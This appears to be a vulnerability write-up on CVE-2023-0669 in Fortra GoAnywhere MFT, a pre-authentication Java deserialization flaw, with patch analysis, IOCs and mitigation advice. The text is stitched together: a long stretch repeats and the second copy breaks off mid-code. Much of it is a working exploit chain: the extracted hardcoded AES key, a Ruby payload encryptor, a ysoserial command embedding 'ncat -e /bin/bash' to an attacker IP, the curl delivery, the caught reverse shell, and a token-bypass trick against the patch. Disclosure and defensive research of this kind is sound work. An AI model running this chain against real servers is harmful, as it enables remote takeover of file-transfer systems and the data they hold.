As of this writing, no patch is available, but Fortra has posted steps to mitigate the issue by disabling the licensing service.

Based on the mitigations published by Fortra, we confirmed that this is a pre-authentication deserialization issue. To exploit the vulnerability, you either need network-level access to GoAnywhere MFT’s administration port (by default, port 8000), but this can also be exploited via an internal user’s browser, as we’ll demonstrate below.

*Updated on 2023-02-13*

On February 7, 2023, Fortra released version 7GoAnywhere MFT 7.1.2 to resolve this issue. We added an analysis of the patch below.

## Technical analysis

The vendor’s advisory was helpful, since it points to the vulnerable endpoint:

```
<servlet>
     <servlet-name>License Response Servlet</servlet-name>
     <servlet-class>com.linoma.ga.ui.admin.servlet.LicenseResponseServlet</servlet-class>
     <load-on-startup>0</load-on-startup>
</servlet>
<servlet-mapping>
     <servlet-name>Licenses Response Servlet</servlet-name>
     <url-pattern>/lic/accept/</url-pattern>

```

Using the [`jadx` Java decompiler](https://github.com/skylot/jadx), we decompiled their application and found `LicenseResponseServlet`:

```
    public void doPost(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse) throws ServletException, IOException {
        Response response = null;
        try {
            response = LicenseAPI.getResponse(httpServletRequest.getParameter(LicenseServer.BUNDLE_PARAM));
        } catch (Exception e) {
            LOGGER.error("Error parsing license response", (Throwable) e);
            httpServletResponse.sendError(500);
        }
        httpServletRequest.getSession().setAttribute(LicenseServer.RESPONSE_PARAM, response);
        httpServletRequest.getSession().setAttribute(SessionAttributes.SESSION_GOTO_OUTCOME.getAttributeKey(), ADMIN_LICENSE_OUTCOME);
        httpServletResponse.sendRedirect(httpServletRequest.getScheme() + "://" + httpServletRequest.getServerName() + ":" + httpServletRequest.getServerPort() + "/goanywhere/admin/License.xhtml");
    }
    public void doGet(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse) throws ServletException, IOException {
        doPost(httpServletRequest, httpServletResponse);
    }

```

From that, we know it’s a `GET` or `POST` request, uses the parameter `LicenseServer.BUNDLE_PARAM` (which is `bundle`), and the logic in `LicenseAPI.getResponse()`, which simply calls `LicenseController.getResponse()`:

```
    /* JADX INFO: Access modifiers changed from: protected */
    public static Response getResponse(String str) throws BundleException, JAXBException {
        return (Response) inflate(BundleWorker.unbundle(str, getProductKeyConfig(getVersion(str))), Response.class); // getVersion will be 2
    }

```

The `getProductKeyConfig()` code isn’t important, so let’s look at `BundleWorker.unbundle()`:

```
    /* JADX INFO: Access modifiers changed from: protected */
    public static String unbundle(String str, KeyConfig keyConfig) throws BundleException {
        try {
            if (!"1".equals(keyConfig.getVersion())) {
                str = str.substring(0, str.indexOf("$"));
            }
            return new String(decompress(verify(decrypt(decode(str.getBytes(StandardCharsets.UTF_8)), keyConfig.getVersion()), keyConfig)), StandardCharsets.UTF_8);
        } catch (CryptoException e) {
            // [...]
        }
    }

```

The important line is the last one in the `try` block. First, it calls `decode()`, which is base64 decoding:

```
    private static byte[] decode(byte[] bArr) {
        return Base64.decodeBase64(bArr);
    }

```

Then it passes that into `decrypt()`, which, through several abstractions, eventually uses the following encryption configuration in `com.linoma.license.gen2.LicenseEncryptor`:

```
    private static final byte[] IV = {65, 69, 83, 47, 67, 66, 67, 47, 80, 75, 67, 83, 53, 80, 97, 100};
    // [...]

    public void initialize(boolean z) throws Exception {
        if (!z) {
            this.encryptor = new Encryptor(new StandardEncryptionEngine(getInitializationValue(), IV, "AES", "AES/CBC/PKCS5Padding"));
        }
        this.encryptorV2 = new Encryptor(new StandardEncryptionEngine(getInitializationValueV2(), IV, "AES", "AES/CBC/PKCS5Padding"));
        this.initialized = true;
    }

    private byte[] getInitializationValue() throws Exception {
        return SecretKeyFactory.getInstance("PBKDF2WithHmacSHA1").generateSecret(new PBEKeySpec(new String("go@nywhereLicenseP@$$wrd".getBytes(), "UTF-8").toCharArray(), new byte[]{-19, 45, -32, -73, 65, 123, -7, 85}, 9535, 256)).getEncoded();
    }

    private byte[] getInitializationValueV2() throws Exception {
        return SecretKeyFactory.getInstance("PBKDF2WithHmacSHA1").generateSecret(new PBEKeySpec(new String("pFRgrOMhauusY2ZDShTsqq2oZXKtoW7R".getBytes(), "UTF-8").toCharArray(), new byte[]{99, 76, 71, 87, 49, 74, 119, 83, 109, 112, 50, 75, 104, 107, 56, 73}, 3392, 256)).getEncoded();
    }

```

The `V2` variation of the function is what we’ll use. It generates a key based on a static string. We simply ran that function in our own Java application to pull that string out:

```
$ cat Test.java
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.PBEKeySpec;
public class Test {
  public static void main(String[] args) throws Exception {
    byte []iv = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA1").generateSecret(new PBEKeySpec(new String("pFRgrOMhauusY2ZDShTsqq2oZXKtoW7R".getBytes(), "UTF-8").toCharArray(), new byte[]{99, 76, 71, 87, 49, 74, 119, 83, 109, 112, 50, 75, 104, 107, 56, 73}, 3392, 256)).getEncoded();
    System.out.write(iv);
  }
}
$ javac Test.java && java Test | hexdump -C
00000000  0e 69 a3 83 9b 6e cf 45  64 9b 86 1f 4a 27 17 1b  |.i...n.Ed...J'..|
00000010  66 87 0c 95 67 a4 14 4e  ba f3 d5 2f dc 40 64 ca  |f...g..N.../.@d.|

```

That’s the encryption key that the licensing bundle is encrypted with. The IV is hardcoded, and is the literal string `"AES/CBC/PKCS5Pad"`. Based on the key length, we know it’s AES-256. With all this in mind, we can encrypt our own licensing blob:

```
require 'base64'
require 'openssl'
PAYLOAD = File.read(ARGV[0])
KEY = "\x0e\x69\xa3\x83\x9b\x6e\xcf\x45\x64\x9b\x86\x1f\x4a\x27\x17\x1b\x66\x87\x0c\x95\x67\xa4\x14\x4e\xba\xf3\xd5\x2f\xdc\x40\x64\xca"
IV = "AES/CBC/PKCS5Pad"
cipher = OpenSSL::Cipher::AES.new('256-CBC')
cipher.encrypt
cipher.iv = IV
cipher.key = KEY
encryptedObject = cipher.update(PAYLOAD) + cipher.final
print Base64::urlsafe_encode64(encryptedObject)

```

Once the `decrypt()` function completes, the `unbundle()` function passes the decrypted stream into `verify()`:

```
    private static byte[] verify(byte[] bDecryptedObject, KeyConfig keyConfig) throws IOException, ClassNotFoundException, NoSuchAlgorithmException, InvalidKeyException, SignatureException, UnrecoverableKeyException, CertificateException, KeyStoreException {
        ObjectInputStream objectInputStream = null;
        try {
            String str = JCAConstants.SIGNATURE_DSA_SHA1;
            if ("2".equals(keyConfig.getVersion())) {
                str = JCAConstants.SIGNATURE_RSA_SHA512;
            }
            PublicKey publicKey = getPublicKey(keyConfig);
            ObjectInputStream objectInputStream2 = new ObjectInputStream(new ByteArrayInputStream(bDecryptedObject));
            SignedObject signedObject = (SignedObject) objectInputStream2.readObject();
            if (!signedObject.verify(publicKey, Signature.getInstance(str))) {
                throw new IOException("Unable to verify signature!");
            }
            byte[] data = ((SignedContainer) signedObject.getObject()).getData();
            if (objectInputStream2 != null) {
                objectInputStream2.close();
            }
            return data;
        } catch (Throwable th) {
            if (0 != 0) {
                objectInputStream.close();
            }
            throw th;
        }
    }

```

That code loads the decrypted object as a Java object, specifically a `SignedObject`; however, the `objectInputStream2.readObject()` call is enough to know that this is a deserialization issue. So we can generate a payload with [`ysoserial`](https://github.com/frohoff/ysoserial):

```
$ java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 "ncat -e /bin/bash 10.0.0.179 4444" > payload.ser

```

Then we encrypt it with our PoC tool and send with `curl` (the `$2` is a version number; version 1 has a different key, but is otherwise essentially the same):

```
$ curl -ikX POST 'http://10.0.0.219:8000/goanywhere/lic/accept?bundle='$(ruby ./poc-cve-2023-0669.rb ./payload.ser)'$2' > /dev/null

```

And, sure enough, we get a shell back:

```
$ nc -v -l -p 4444
[...]
Ncat: Connection from 10.0.0.219.
Ncat: Connection from 10.0.0.219:46832.

```
### Cross-site request forgery

The way this licensing code is *supposed* to work is:

* The administrator installs GoAnywhere MFT with no license
* When the administrator visits their installation, they’re sent to an internet URL, [https://my.goanywhere.com/lic/request?bundle=p55wfyVKXDVM\_bAVZtD[…](https://my.goanywhere.com/lic/request?bundle=p55wfyVKXDVM_bAVZtD[...)]
* The user authenticates and selects their license and everything
* my.goanywhere.com redirects the user back to their server, on the endpoint `/goanywhere/lic/accept`, with the `bundle=` parameter set to the encrypted and serialized license object (that we saw earlier). The redirect looks something like:

```
HTTP/2 302 Found
Date: Fri, 03 Feb 2023 21:25:04 GMT
Content-Length: 0

Server: cloudflare

```

And sends the user to:

```
GET /goanywhere/lic/accept?bundle=p55[...]A$2 HTTP/1.1
Host: 10.0.0.219:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0

Upgrade-Insecure-Requests: 1

```

The administrator’s server decrypts, loads, and verifies the license, and the server is either licensed (or isn’t).

Note that there is no CSRF protection (and the cookie is not actually required, so no authentication is required to exploit this issue). That means that this can, *by design*, be exploited via cross-site request forgery—based on how the licensing works, the user is supposed to be redirected to that endpoint by a server that’s not on their network.

What all this means is that a sufficiently clever attacker who is familiar with the target network can target a user with network-level access to the administration port, and redirect the user’s browser (via an open redirect or phishing message or something else) to the vulnerable server.

### Patch Analysis

On February 7, 2023, Fortra released a patch – version 7.1.2 for both Linux and Windows. If we try to run [our Metasploit module](https://github.com/rapid7/metasploit-framework/pull/17607) against the patched version, we get an HTTP/400 error:

```
msf6 exploit(multi/http/fortra_goanywhere_rce_cve_2023_0669) > set RHOSTS 10.0.0.219
RHOSTS => 10.0.0.219
msf6 exploit(multi/http/fortra_goanywhere_rce_cve_2023_0669) > set LHOST 10.0.0.179
LHOST => 10.0.0.179
msf6 exploit(multi/http/fortra_goanywhere_rce_cve_2023_0669) > exploit
[*] Started reverse TCP handler on 10.0.0.179:4444
[-] Exploit aborted due to failure: unexpected-reply: Expected the server to return HTTP/500, instead received HTTP/400
[*] Exploit completed, but no session was created.

```

In the logs, we can see that the request was rejected due to being from an “invalid session”:

```
2/8/23, 2:31:49 PM ERROR An error occurred while processing the request URI '/goanywhere/lic/accept/0ec5b0f4-c0a7-4df9-abfd-e9ccff5c5e89' from the ip address '10.0.0.179'. The HTTP status code is '500'
2/8/23, 2:53:24 PM ERROR Unauthorized bundle from invalid session: _ej

```

Looking at the `LicenseResponseServlet` class again, we see where that error message came from:

```
public class LicenseResponseServlet extends HttpServlet {
    // [...]
    public void doPost(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse) throws ServletException, IOException {
        String parameter = httpServletRequest.getParameter(LicenseServer.BUNDLE_PARAM);
        String[] split = httpServletRequest.getRequestURI().split("/");
        if (!SessionUtilities.isLicenseRequestTokenValid(split[split.length - 1], httpServletRequest.getSession())) {
            LOGGER.error("Unauthorized bundle from invalid session: " + parameter);
            httpServletResponse.sendError(400);
            httpServletRequest.getSession().removeAttribute(SessionAttributes.LICENSE_REQUEST_TOKEN.getAttributeKey());
            return;
        }
        // [...]
    }
    // [...]
}

```

The new code in `SessionUtilities.isLicenseRequestTokenValid()` checks a random UUID that is generated when performing the licensing request and stored in the session:

```
    public static boolean isLicenseRequestTokenValid(String str, HttpSession httpSession) {
        if (httpSession != null) {
            String str2 = (String) httpSession.getAttribute(SessionAttributes.LICENSE_REQUEST_TOKEN.getAttributeKey());
            if (str != null && str.equals(str2)) {
                return true;
            }
            return false;
        }
        return false;
    }

```

That token is basically an anti-CSRF token, and is sent to the server as part of the encrypted bundle. But because the bundle is symmetrically encrypted, we can actually get access to that value. We can get the encrypted bundle from a new server (with no license installed) by requesting the manual activation page:

```
$ curl 'http://10.0.0.219:8000/goanywhere/license/ManualLicense.xhtml'
[...]
p55wfyVKXDVM/bAVZtDLOg[.......]$2
[...]

```

That page isn’t accessible (anonymously) once a license has been installed, though. But after trying different requests, we noticed that you can append a character to the `Unlicensed.xhtml` page to view it even after licensing the server. Here’s an example, where we changed the page to `Unlicensed.xhtmlx`:

```
$ curl -i 'http://10.0.0.219:8000/goanywhere/license/Unlicensed.xhtmlx?GARequestAction=activate'
HTTP/1.1 302
[...]
Set-Cookie: ASESSIONID=CE484D19BEF02A4C4093EFA1F5626B54; Path=/goanywhere; HttpOnly

Content-Length: 0
Date: Wed, 08 Feb 2023 23:36:58 GMT

```

The `bundle` parameter in the `Location` header is the encrypted bundle. We wrote some Java code that uses GoAnywhere MFT’s own libraries to decrypt it:

```
import com.linoma.license.gen2.*;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.ObjectInputStream;
import java.nio.charset.StandardCharsets;
import java.security.SignedObject;
import java.util.zip.GZIPInputStream;
import org.apache.commons.codec.binary.Base64;
import org.apache.commons.io.IOUtils;
public class DecodeBundle {
  public static void main(String[] args) throws Exception {
    // Initialize the encryption code
    LicenseEncryptor.getInstance().initialize(true);
    // Decode the base64
    byte []decoded = Base64.decodeBase64(args[0].getBytes(StandardCharsets.UTF_8));
    // Decrypt the AES
    byte []decrypted = LicenseEncryptor.getInstance().decrypt(decoded, "2");
    // Unwrap the data that's in a SignedObject and SignedContainer
    ObjectInputStream secureObjectInputStream = new ObjectInputStream(new ByteArrayInputStream(decrypted));
    SignedObject signedObject = (SignedObject) secureObjectInputStream.readObject();
    byte[] data = ((SignedContainer) signedObject.getObject()).getData();
    // Uncompress
    GZIPInputStream gZIPInputStream = new GZIPInputStream(new ByteArrayInputStream(data));
    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
    IOUtils.copy(gZIPInputStream, byteArrayOutputStream);
    byte []uncompressed = byteArrayOutputStream.toByteArray();
    // Display
    System.out.write(uncompressed);
  }
}

```

It has to be compiled and executed using GoAnywhere MFT’s .jar files in order to access the functions:

```
$ export CP=".:GoAnywhere-7.1.2/lib/licenseapi-2.0-4.0.1.jar:GoAnywhere-7.1.2/lib/linoma-security-commons-1.0.0.jar:GoAnywhere-7.1.2/lib/commons-io-2.11.0.jar:GoAnywhere-7.1.2/lib/commons-codec-1.15.jar:GoAnywhere-7.1.2/lib/linoma-security-core-1.0.0.jar"
$ javac -cp $CP DecodeBundle.java && java -cp $CP DecodeBundle "p55[...]k"
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<request v="2" t="1">

        <cancel>http://10.0.0.219:8000/goanywhere/license/Unlicensed.xhtml</cancel>

    <s os="Linux">
        <u>00-0C-29-47-38-B5</u>
    </s>
</request>

```

It successfully decrypted the token, giving us a `<process>` and `<cancel>` link. The `<process>` link specifically contains the full URL you need to successfully pass the new `LICENSE_REQUEST_TOKEN` check. Here’s how we can send the same payload (note that we also need the session ID cookie – `ASESSIONID`):

```
$ curl -ib 'ASESSIONID=CE484D19BEF02A4C4093EFA1F5626B54' -ik 'http://10.0.0.219:8000/goanywhere/lic/accept/d2d80248-5013-41b8-8cbf-1c1ca9bc3541?bundle='$(ruby ./poc-cve-2023-0669.rb ./payload.ser)'$2'
HTTP/1.1 500
X-UA-Compatible: IE=edge
[...]

```

With that change, we are now back to the HTTP/500 error from earlier! But in the logs, we see a new error:

```
com.linoma.license.gen2.BundleException: Class name not accepted: java.util.PriorityQueue
	at com.linoma.license.gen2.BundleWorker.unbundle(BundleWorker.java:136)
	at com.linoma.license.gen2.LicenseController.getResponse(LicenseController.java:441)
	at com.linoma.license.gen2.LicenseAPI.getResponse(LicenseAPI.java:304)

	at org.apache.commons.io.serialization.ValidatingObjectInputStream.resolveClass(ValidatingObjectInputStream.java:100)

```

That led us to look more closely at the `BundleWorker.validate()` function:

```
   private static byte[] verify(byte[] bArr, KeyConfig keyConfig) throws IOException, ClassNotFoundException, NoSuchAlgorithmException, InvalidKeyException, SignatureException, UnrecoverableKeyException, CertificateException, KeyStoreException {
        ObjectInputStream secureObjectInputStream = getSecureObjectInputStream(bArr, SignedObject.class, byte[].class);
        try {
            String str = JCAConstants.SIGNATURE_DSA_SHA1;
            if ("2".equals(keyConfig.getVersion())) {
                str = JCAConstants.SIGNATURE_RSA_SHA512;
            }
            PublicKey publicKey = getPublicKey(keyConfig);
            SignedObject signedObject = (SignedObject) secureObjectInputStream.readObject();
            if (!signedObject.verify(publicKey, Signature.getInstance(signatureType))) {
                throw new IOException("Unable to verify signature!");
            }
            byte[] data = ((SignedContainer) signedObject.getObject()).getData();
            if (secureObjectInputStream != null) {
                secureObjectInputStream.close();
            }
            return data;
        } catch (Throwable th) {
            // [...]
        }
    }

```

`getSecureObjectInputStream` returns an instance of `org.apache.commons.io.serialization.ValidatingObjectInputStream` that only permits two classes to be deserialized: `SignedObject` and `byte[]`. The first thing it does after creating the `SignedObject` is to verify it, using a `publicKey` that’s decrypted from a local keystore. We verified that we don’t have the associated private key, nor can we modify fields in `SignedObject` to force the `verify()` call to pass, so this signature check appears to prevent further exploitation.

So in the end, we were able to bypass the new `LICENSE_REQUEST_TOKEN` requirement, but the `ValidatingObjectInputStream` and `SignedObject` prevents a malicious object from being deserialized.

## IOCs

The vendor’s advisory suggests the following:

```
Search the userdata/logs/[system_name]-goanywhere.log files on your system.
NOTE: By default there are 10 logs that are archived when a log size reaches 5 MB. [system_name] represents each system or node in your cluster. You should search all of these 10 archive logs for all systems/nodes in your cluster. Standalone (non-HA) logs will be goanywhere.log, goanywhere.log1, goanywhere.log2, etc.)
The search term should be for the following line:
java.lang.RuntimeException: InvocationTargetException: java.lang.reflect.InvocationTargetException
     at org.apache.commons.beanutils.BeanComparator.compare(BeanComparator.java:171)
     at java.util.PriorityQueue.siftDownUsingComparator(PriorityQueue.java:721)
     at java.util.PriorityQueue.siftDown(PriorityQueue.java:687)
     at java.util.PriorityQueue.heapify(PriorityQueue.java:736)
     at java.util.PriorityQueue.readObject(PriorityQueue.java:796)

```

We confirmed that that’s the error that our proof of concept generates, as well. Keep in mind, however, that the attacker can delete that logfile if they choose.

## Guidance

As of writing, this issue is not patched, and therefore all installations are vulnerable. Ensuring that network-level access to the administrator port is restricted to the least number of users possible is good; however, because this can be exploited via a user’s browser, it only raises the bar.

The vendor advises that user’s remove access to the vulnerable endpoint in their `web.xml` file:

```
-   Disable the LicenseResponseServlet as follows:
-   On the file system where GoAnywhere MFT is installed, edit the file [install_dir]/adminroot/WEB-INF/web.xml
-   Find and remove (delete or comment out) the following servlet and servlet-mapping configuration in the screenshot below.

###### Technical Analysis

## Description

On February 1, 2023, Fortra (formerly HelpSystems) posted a security advisory for a remote pre-authentication remote code execution vulnerability in their [GoAnywhere MFT](https://www.goanywhere.com/) managed file transfer solution. The advisory requires a (free) account in order to view; notably, hiding security advisories behind a customer portal is something we heavily discourage. It’s optimal when this type of information is public so users can stay informed and protect themselves as easily as possible.

As of this writing, no patch is available, but Fortra has posted steps to mitigate the issue by disabling the licensing service.

Based on the mitigations published by Fortra, we confirmed that this is a pre-authentication deserialization issue. To exploit the vulnerability, you either need network-level access to GoAnywhere MFT’s administration port (by default, port 8000), but this can also be exploited via an internal user’s browser, as we’ll demonstrate below.

*Updated on 2023-02-13*

On February 7, 2023, Fortra released version 7GoAnywhere MFT 7.1.2 to resolve this issue. We added an analysis of the patch below.

## Technical analysis

The vendor’s advisory was helpful, since it points to the vulnerable endpoint:

```
<servlet>
     <servlet-name>License Response Servlet</servlet-name>
     <servlet-class>com.linoma.ga.ui.admin.servlet.LicenseResponseServlet</servlet-class>
     <load-on-startup>0</load-on-startup>
</servlet>
<servlet-mapping>
     <servlet-name>Licenses Response Servlet</servlet-name>
     <url-pattern>/lic/accept/</url-pattern>

```

Using the [`jadx` Java decompiler](https://github.com/skylot/jadx), we decompiled their application and found `LicenseResponseServlet`:

```
    public void doPost(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse) throws ServletException, IOException {
        Response response = null;
        try {
            response = LicenseAPI.getResponse(httpServletRequest.getParameter(LicenseServer.BUNDLE_PARAM));
        } catch (Exception e) {
            LOGGER.error("Error parsing license response", (Throwable) e);
            httpServletResponse.sendError(500);
        }
        httpServletRequest.getSession().setAttribute(LicenseServer.RESPONSE_PARAM, response);
        httpServletRequest.getSession().setAttribute(SessionAttributes.SESSION_GOTO_OUTCOME.getAttributeKey(), ADMIN_LICENSE_OUTCOME);
        httpServletResponse.sendRedirect(httpServletRequest.getScheme() + "://" + httpServletRequest.getServerName() + ":" + httpServletRequest.getServerPort() + "/goanywhere/admin/License.xhtml");
    }
    public void doGet(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse) throws ServletException, IOException {
        doPost(httpServletRequest, httpServletResponse);
    }

```

From that, we know it’s a `GET` or `POST` request, uses the parameter `LicenseServer.BUNDLE_PARAM` (which is `bundle`), and the logic in `LicenseAPI.getResponse()`, which simply calls `LicenseController.getResponse()`:

```
    /* JADX INFO: Access modifiers changed from: protected */
    public static Response getResponse(String str) throws BundleException, JAXBException {
        return (Response) inflate(BundleWorker.unbundle(str, getProductKeyConfig(getVersion(str))), Response.class); // getVersion will be 2
    }

```

The `getProductKeyConfig()` code isn’t important, so let’s look at `BundleWorker.unbundle()`:

```
    /* JADX INFO: Access modifiers changed from: protected */
    public static String unbundle(String str, KeyConfig keyConfig) throws BundleException {
        try {
            if (!"1".equals(keyConfig.getVersion())) {
                str = str.substring(0, str.indexOf("$"));
            }
            return new String(decompress(verify(decrypt(decode(str.getBytes(StandardCharsets.UTF_8)), keyConfig.getVersion()), keyConfig)), StandardCharsets.UTF_8);
        } catch (CryptoException e) {
            // [...]
        }
    }

```

The important line is the last one in the `try` block. First, it calls `decode()`, which is base64 decoding:

```
    private static byte[] decode(byte[] bArr) {
        return Base64.decodeBase64(bArr);
    }

```

Then it passes that into `decrypt()`, which, through several abstractions, eventually uses the following encryption configuration in `com.linoma.license.gen2.LicenseEncryptor`:

```
    private static final byte[] IV = {65, 69, 83, 47, 67, 66, 67, 47, 80, 75, 67, 83, 53, 80, 97, 100};
    // [...]

    public void initialize(boolean z) throws Exception {
        if (!z) {
            this.encryptor = new Encryptor(new StandardEncryptionEngine(getInitializationValue(), IV, "AES", "AES/CBC/PKCS5Padding"));
        }
        this.encryptorV2 = new Encryptor(new StandardEncryptionEngine(getInitializationValueV2(), IV, "AES", "AES/CBC/PKCS5Padding"));
        this.initialized = true;
    }

    private byte[] getInitializationValue() throws Exception {
        return SecretKeyFactory.getInstance("PBKDF2WithHmacSHA1").generateSecret(new PBEKeySpec(new String("go@nywhereLicenseP@$$wrd".getBytes(), "UTF-8").toCharArray(), new byte[]{-19, 45, -32, -73, 65, 123, -7, 85}, 9535, 256)).getEncoded();
    }

    private byte[] getInitializationValueV2() throws Exception {
        return SecretKeyFactory.getInstance("PBKDF2WithHmacSHA1").generateSecret(new PBEKeySpec(new String("pFRgrOMhauusY2ZDShTsqq2oZXKtoW7R".getBytes(), "UTF-8").toCharArray(), new byte[]{99, 76, 71, 87, 49, 74, 119, 83, 109, 112, 50, 75, 104, 107, 56, 73}, 3392, 256)).getEncoded();
    }

```

The `V2` variation of the function is what we’ll use. It generates a key based on a static string. We simply ran that function in our own Java application to pull that string out:

```
$ cat Test.java
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.PBEKeySpec;
public class Test {
  public static void main(String[] args) throws Exception {
    byte []iv = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA1").generateSecret(new PBEKeySpec(new String("pFRgrOMhauusY2ZDShTsqq2oZXKtoW7R".getBytes(), "UTF-8").toCharArray(), new byte[]{99, 76, 71, 87, 49, 74, 119, 83, 109, 112, 50, 75, 104, 107, 56, 73}, 3392, 256)).getEncoded();
    System.out.write(iv);
  }
}
$ javac Test.java && java Test | hexdump -C
00000000  0e 69 a3 83 9b 6e cf 45  64 9b 86 1f 4a 27 17 1b  |.i...n.Ed...J'..|
00000010  66 87 0c 95 67 a4 14 4e  ba f3 d5 2f dc 40 64 ca  |f...g..N.../.@d.|

```

That’s the encryption key that the licensing bundle is encrypted with. The IV is hardcoded, and is the literal string `"AES/CBC/PKCS5Pad"`. Based on the key length, we know it’s AES-256. With all this in mind, we can encrypt our own licensing blob:

```
require 'base64'
require 'openssl'
PAYLOAD = File.read(ARGV[0])
KEY = "\x0e\x69\xa3\x83\x9b\x6e\xcf\x45\x64\x9b\x86\x1f\x4a\x27\x17\x1b\x66\x87\x0c\x95\x67\xa4\x14\x4e\xba\xf3\xd5\x2f\xdc\x40\x64\xca"
IV = "AES/CBC/PKCS5Pad"
cipher = OpenSSL::Cipher::AES.new('256-CBC')
cipher.encrypt
cipher.iv = IV
cipher.key = KEY
encryptedObject = cipher.update(PAYLOAD) + cipher.final
print Base64::urlsafe_encode64(encryptedObject)

```

Once the `decrypt()` function completes, the `unbundle()` function passes the decrypted stream into `verify()`:

```
    private static byte[] verify(byte[] bDecryptedObject, KeyConfig keyConfig) throws IOException, ClassNotFoundException, NoSuchAlgorithmException, InvalidKeyException, SignatureException, UnrecoverableKeyException, CertificateException, KeyStoreException {
        ObjectInputStream objectInputStream = null;
        try {
            String str = JCAConstants.SIGNATURE_DSA_SHA1;
            if ("2".equals(keyConfig.getVersion())) {
                str = JCAConstants.SIGNATURE_RSA_SHA512;
            }
            PublicKey publicKey = getPublicKey(keyConfig);
            ObjectInputStream objectInputStream2 = new ObjectInputStream(new ByteArrayInputStream(bDecryptedObject));
            SignedObject signedObject = (SignedObject) objectInputStream2.readObject();
            if (!signedObject.verify(publicKey, Signature.getInstance(str))) {
                throw new IOException("Unable to verify signature!");
            }
            byte[] data = ((SignedContainer) signedObject.getObject()).getData();
            if (objectInputStream2 != null) {
                objectInputStream2.close();
            }
            return data;
        } catch (Throwable th) {
            if (0 != 0) {
                objectInputStream.close();
            }
            throw th;
        }
    }

```

That code loads the decrypted object as a Java object, specifically a `SignedObject`; however, the `objectInputStream2.readObject()` call is enough to know that this is a deserialization issue. So we can generate a payload with [`ysoserial`](https://github.com/frohoff/ysoserial):

```
$ java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 "ncat -e /bin/bash 10.0.0.179 4444" > payload.ser

```

Then we encrypt it with our PoC tool and send with `curl` (the `$2` is a version number; version 1 has a different key, but is otherwise essentially the same):

```
$ curl -ikX POST 'http://10.0.0.219:8000/goanywhere/lic/accept?bundle='$(ruby ./poc-cve-2023-0669.rb ./payload.ser)'$2' > /dev/null

```

And, sure enough, we get a shell back:

```
$ nc -v -l -p 4444
[...]
Ncat: Connection from 10.0.0.219.
Ncat: Connection from 10.0.0.219:46832.

### Cross-site request forgery

The way this licensing code is *supposed* to work is:

* The administrator installs GoAnywhere MFT with no license
* When the administrator visits their installation, they’re sent to an internet URL, [https://my.goanywhere.com/lic/request?bundle=p55wfyVKXDVM\_bAVZtD[…](https://my.goanywhere.com/lic/request?bundle=p55wfyVKXDVM_bAVZtD[...)]
* The user authenticates and selects their license and everything
* my.goanywhere.com redirects the user back to their server, on the endpoint `/goanywhere/lic/accept`, with the `bundle=` parameter set to the encrypted and serialized license object (that we saw earlier). The redirect looks something like:

```
HTTP/2 302 Found
Date: Fri, 03 Feb 2023 21:25:04 GMT
Content-Length: 0

Cf-Cache-Status: DYNAMIC
Server: cloudflare

```

And sends the user to:

```
GET /goanywhere/lic/accept?bundle=p55[...]A$2 HTTP/1.1
Host: 10.0.0.219:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0

Upgrade-Insecure-Requests: 1

```

The administrator’s server decrypts, loads, and verifies the license, and the server is either licensed (or isn’t).

Note that there is no CSRF protection (and the cookie is not actually required, so no authentication is required to exploit this issue). That means that this can, *by design*, be exploited via cross-site request forgery—based on how the licensing works, the user is supposed to be redirected to that endpoint by a server that’s not on their network.

What all this means is that a sufficiently clever attacker who is familiar with the target network can target a user with network-level access to the administration port, and redirect the user’s browser (via an open redirect or phishing message or something else) to the vulnerable server.

### Patch Analysis

On February 7, 2023, Fortra released a patch – version 7.1.2 for both Linux and Windows. If we try to run [our Metasploit module](https://github.com/rapid7/metasploit-framework/pull/17607) against the patched version, we get an HTTP/400 error:

```
msf6 exploit(multi/http/fortra_goanywhere_rce_cve_2023_0669) > set RHOSTS 10.0.0.219
RHOSTS => 10.0.0.219
msf6 exploit(multi/http/fortra_goanywhere_rce_cve_2023_0669) > set LHOST 10.0.0.179
LHOST => 10.0.0.179
msf6 exploit(multi/http/fortra_goanywhere_rce_cve_2023_0669) > exploit
[*] Started reverse TCP handler on 10.0.0.179:4444
[-] Exploit aborted due to failure: unexpected-reply: Expected the server to return HTTP/500, instead received HTTP/400
[*] Exploit completed, but no session was created.

```

In the logs, we can see that the request was rejected due to being from an “invalid session”:

```
2/8/23, 2:31:49 PM ERROR An error occurred while processing the request URI '/goanywhere/lic/accept/0ec5b0f4-c0a7-4df9-abfd-e9ccff5c5e89' from the ip address '10.0.0.179'. The HTTP status code is '500'
2/8/23, 2:53:24 PM ERROR Unauthorized bundle from invalid session: _ej

```

Looking at the `LicenseResponseServlet` class again, we see where that error message came from:

```
public class LicenseResponseServlet extends HttpServlet {
    // [...]
    public void doPost(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse) throws ServletException, IOException {
        String parameter = httpServletRequest.getParameter(LicenseServer.BUNDLE_PARAM);
        String[] split = httpServletRequest.getRequestURI().split("/");
        if (!SessionUtilities.isLicenseRequestTokenValid(split[split.length - 1], httpServletRequest.getSession())) {
            LOGGER.error("Unauthorized bundle from invalid session: " + parameter);
            httpServletResponse.sendError(400);
            httpServletRequest.getSession().removeAttribute(SessionAttributes.LICENSE_REQUEST_TOKEN.getAttributeKey());
            return;
        }
        // [...]
    }
    // [...]
}

```

The new code in `SessionUtilities.isLicenseRequestTokenValid()` checks a random UUID that is generated when performing the licensing request and stored in the session:

```
    public static boolean isLicenseRequestTokenValid(String str, HttpSession httpSession) {
        if (httpSession != null) {
            String str2 = (String) httpSession.getAttribute(SessionAttributes.LICENSE_REQUEST_TOKEN.getAttributeKey());
            if (str != null && str.equals(str2)) {
